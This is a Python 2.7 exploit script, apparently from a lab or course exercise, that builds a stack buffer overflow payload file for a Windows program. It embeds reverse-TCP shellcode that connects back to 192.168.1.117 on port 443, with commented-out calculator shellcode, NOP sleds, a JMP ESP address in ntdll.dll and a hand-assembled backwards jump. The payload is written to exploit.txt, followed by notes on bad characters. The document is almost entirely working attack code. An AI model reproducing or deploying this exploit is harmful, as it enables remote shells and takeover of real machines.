#Exploit in python 2.7
from struct import pack

#Turn off sehop - https://samsclass.info/127/proj/p15-seha.htm

# buf =  b"" #launch calculator shellcode
# buf += b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
# buf += b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
# buf += b"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
# buf += b"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
# buf += b"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
# buf += b"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
# buf += b"\x45\x81\x3e\x43\x72\x65\x61\x75"
# buf += b"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
# buf += b"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
# buf += b"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
# buf += b"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
# buf += b"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
# buf += b"\x6c\x63\x89\xe2\x52\x52\x53\x53"
# buf += b"\x53\x53\x53\x53\x52\x53\xff\xd7"

buf =  b"" #Reverse TCP connects to 192.168.1.117 on port 443
buf += b"\xbb\xc2\xb0\xa4\x99\xd9\xcb\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x52\x31\x5f\x12\x83\xef\xfc\x03\x9d\xbe\x46"
buf += b"\x6c\xdd\x57\x04\x8f\x1d\xa8\x69\x19\xf8\x99\xa9\x7d"
buf += b"\x89\x8a\x19\xf5\xdf\x26\xd1\x5b\xcb\xbd\x97\x73\xfc"
buf += b"\x76\x1d\xa2\x33\x86\x0e\x96\x52\x04\x4d\xcb\xb4\x35"
buf += b"\x9e\x1e\xb5\x72\xc3\xd3\xe7\x2b\x8f\x46\x17\x5f\xc5"
buf += b"\x5a\x9c\x13\xcb\xda\x41\xe3\xea\xcb\xd4\x7f\xb5\xcb"
buf += b"\xd7\xac\xcd\x45\xcf\xb1\xe8\x1c\x64\x01\x86\x9e\xac"
buf += b"\x5b\x67\x0c\x91\x53\x9a\x4c\xd6\x54\x45\x3b\x2e\xa7"
buf += b"\xf8\x3c\xf5\xd5\x26\xc8\xed\x7e\xac\x6a\xc9\x7f\x61"
buf += b"\xec\x9a\x8c\xce\x7a\xc4\x90\xd1\xaf\x7f\xac\x5a\x4e"
buf += b"\xaf\x24\x18\x75\x6b\x6c\xfa\x14\x2a\xc8\xad\x29\x2c"
buf += b"\xb3\x12\x8c\x27\x5e\x46\xbd\x6a\x37\xab\x8c\x94\xc7"
buf += b"\xa3\x87\xe7\xf5\x6c\x3c\x6f\xb6\xe5\x9a\x68\xb9\xdf"
buf += b"\x5b\xe6\x44\xe0\x9b\x2f\x83\xb4\xcb\x47\x22\xb5\x87"
buf += b"\x97\xcb\x60\x07\xc7\x63\xdb\xe8\xb7\xc3\x8b\x80\xdd"
buf += b"\xcb\xf4\xb1\xde\x01\x9d\x58\x25\xc2\x62\x34\x24\x67"
buf += b"\x0b\x47\x26\x86\x70\xce\xc0\xe2\x96\x87\x5b\x9b\x0f"
buf += b"\x82\x17\x3a\xcf\x18\x52\x7c\x5b\xaf\xa3\x33\xac\xda"
buf += b"\xb7\xa4\x5c\x91\xe5\x63\x62\x0f\x81\xe8\xf1\xd4\x51"
buf += b"\x66\xea\x42\x06\x2f\xdc\x9a\xc2\xdd\x47\x35\xf0\x1f"
buf += b"\x11\x7e\xb0\xfb\xe2\x81\x39\x89\x5f\xa6\x29\x57\x5f"
buf += b"\xe2\x1d\x07\x36\xbc\xcb\xe1\xe0\x0e\xa5\xbb\x5f\xd9"
buf += b"\x21\x3d\xac\xda\x37\x42\xf9\xac\xd7\xf3\x54\xe9\xe8"
buf += b"\x3c\x31\xfd\x91\x20\xa1\x02\x48\xe1\xd1\x48\xd0\x40"
buf += b"\x7a\x15\x81\xd0\xe7\xa6\x7c\x16\x1e\x25\x74\xe7\xe5"
buf += b"\x35\xfd\xe2\xa2\xf1\xee\x9e\xbb\x97\x10\x0c\xbb\xbd"

print("shellcode length = {}".format(len(buf)))

#RETN Address: 0x77ec1053 in ntdll.dll
#JMP ESP Address: 0x77f1e871 in ntdll.dll
jmp_esp = pack("l", 0x77f1e871)
shellcode = buf #351 long shellcode
jmp_backwards_9900 = "\x90\x90\x90\xe9\x4f\xd9\xff\xff" # from jmp_shellcode.asm
# $ cat shellcode.asm
# bits 32
# jmp $-4200
# $ nasm -o shellcode shellcode.asm
# $ hexdump -C shellcode

total_overflow_length = 10012
# #A * 10012 == Just before EIP 
# #A * 1340 == SEH record
pre_nop_count = 150
before_payload_nops =  "\x90" * pre_nop_count
after_payload_nops = "\x90" *  ( total_overflow_length - len(shellcode) - pre_nop_count )


f = open("exploit.txt", "w")
payload = before_payload_nops + shellcode + after_payload_nops + jmp_esp + jmp_backwards_9900
f.write(payload)
f.close()
print("exploit.txt created. Length: {}".format(len(payload)))

# common bad characters are:

#     00 for NULL
#     0A for Line Feed n
#     0D for Carriage Return r
#     FF for Form Feed f